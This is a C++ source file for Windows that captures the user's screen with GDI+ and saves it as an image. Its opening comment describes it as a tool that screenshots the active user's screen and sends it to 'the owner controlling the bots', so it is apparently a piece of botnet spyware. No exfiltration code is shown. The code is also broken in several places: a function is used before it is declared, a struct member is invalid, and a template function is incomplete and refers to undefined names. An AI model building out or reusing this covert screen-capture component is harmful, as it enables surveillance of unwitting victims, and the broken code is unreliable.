//This tool will be used to screenshot the active users screen and then proceed to send it 
//over to the owner controlling the bots

//Windows headers 
#include <Windows.h>
#include <gdiplus.h>

#ifndef TIME
#define TIME
	#include "general_macro.hpp" //Has time function and sysinfoapi.h 
#else
	#include <time.h>
#endif

#include <functional> //Might be used
#include <iostream>
#include <cerrno> 
#include <memory>
#include <algorithm>
#include <filesystem>

//Thanks to https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d for original code
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	//using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;

	//Probably put this into a constexpr macro for compile time opt?
	const WCHAR* InvalidImageTypes[]{
		L"image/bmp",
		L"image/tiff",
		L"image/pcx",
		L"image/tga",
		L"image/iff",
		L"image/sgi", 
		L"image/xpm",
		L"image/pix",
		L"image/ras",
		L"image/sun",
		L"image/wbmp",
		L"image/pict",
		L"image/tiff",
		L"image/dib",
		L"image/xwd",
		L"image/icb",
		L"image/vda",
		L"image/pgm",
		L"image/ppm",
		L"image/pbm",
		L"image/cut",
	};

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{	
			bool isValid = std::count(std::begin(InvalidImageTypes), std::end(InvalidImageTypes),
				pImageCodecInfo[j].MimeType) > 0;

			if (!isValid) {
				std::cerr << "Invalid image type: " << &pImageCodecInfo[j].MimeType << std::endl;
				free(pImageCodecInfo);
				return -1;
			}
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

//Continue working
auto image = SaveImage;

void SaveImage(std::unique_ptr<Gdiplus::Bitmap>& bitmap, const WCHAR* fileType, const WCHAR* filePath) {
	CLSID clsid;
	if (GetEncoderClsid(fileType, &clsid) != 0) {
		std::wcerr << L"Failed to get encoder for " << fileType << std::endl;
		return;
	}
	bitmap->Save(filePath, &clsid, NULL);
}

//Source https://stackoverflow.com/questions/69686934/concept-checking-on-struct-members
template <class T>
std::decay_t<T> decay_copy(T&&);

#define CHECK_MEMBER(name, type) \
{ decay_copy(t.name) } -> type

//Concept needs to be worked on
template<typename T>
concept has_member_variables = requires (T t) {
	CHECK_MEMBER(f, std::floating_point);
	CHECK_MEMBER(i, std::integral);
	CHECK_MEMBER(e, std::string);
};


struct FilterTypes {
	std::vector<const char*> char_vector;
	std::vector<std::string> string_vector;
	//Empty containers for functions;
	std::function<void(char)> char_function;
	std::function<void(std::string)> std::string;
};

template <typename T>
T ReadBitMap(std::unique_ptr<Gdiplus::Bitmap>& bitmap, const WCHAR* filetype, std::optional<struct FilterTypes> filterTypes) {
	struct_has_value<fileTypes>; 
}

std::unique_ptr<Gdiplus::Bitmap> gdiscreen() {
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	HDC scrdc = ::GetDC(0);
	if (!scrdc) {
		std::cerr << "Failed to get screen device context." << std::endl;
		return nullptr;
	}

	int Width = GetSystemMetrics(SM_CXSCREEN);
	int Height = GetSystemMetrics(SM_CYSCREEN);
	HDC memdc = CreateCompatibleDC(scrdc);
	if (!memdc) {
		std::cerr << "Failed to create memory device context." << std::endl;
		::ReleaseDC(0, scrdc);
		return nullptr;
	}

	HBITMAP membit = CreateCompatibleBitmap(scrdc, Width, Height);
	if (!membit) {
		std::cerr << "Failed to create bitmap." << std::endl;
		DeleteDC(memdc);
		::ReleaseDC(0, scrdc);
		return nullptr;
	}

	HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);

	std::unique_ptr<Gdiplus::Bitmap> bitmap = std::make_unique<Gdiplus::Bitmap>(membit, nullptr);
	SelectObject(memdc, hOldBitmap);
	DeleteObject(membit);
	DeleteDC(memdc);
	::ReleaseDC(0, scrdc);

	Gdiplus::GdiplusShutdown(gdiplusToken);
	return bitmap;
}
